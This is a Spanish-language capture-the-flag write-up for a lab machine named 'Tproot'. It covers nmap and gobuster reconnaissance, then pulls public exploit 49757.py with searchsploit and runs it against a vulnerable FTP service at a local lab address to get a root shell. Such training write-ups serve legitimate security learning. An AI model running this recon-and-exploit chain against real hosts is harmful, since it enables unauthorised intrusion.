---
description: '✍️ Autor: d1se0🔍 Dificultad: Muy Fácil 📅 Fecha de creación: 10/02/2025'
---

# Tproot

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1167).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1168).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.&#x20;

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1169).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80 que es la página de por defecto del Apache.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-12 162355.png" alt=""><figcaption></figcaption></figure>

Tampoco en el código fuente encontramos algo relevante por lo que revisaremos los directorios.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/image (1174).png" alt=""><figcaption></figcaption></figure>

No encontramos nada relevante en el puerto 80 por lo que indagaremos en el puerto 21. Revisando la versión del puerto contiene cierta vulnerabilidad importante por lo que vamos a explotarla.

<figure><img src="../../.gitbook/assets/image (1170).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Nos lo descargamos.

```bash
searchsploit -m unix/remote/49757.py
```

<figure><img src="../../.gitbook/assets/image (1172).png" alt=""><figcaption></figcaption></figure>

Ejecutamos.

```bash
python3 49757.py 172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (1173).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

```
whoami
```

Ya somos **root**.
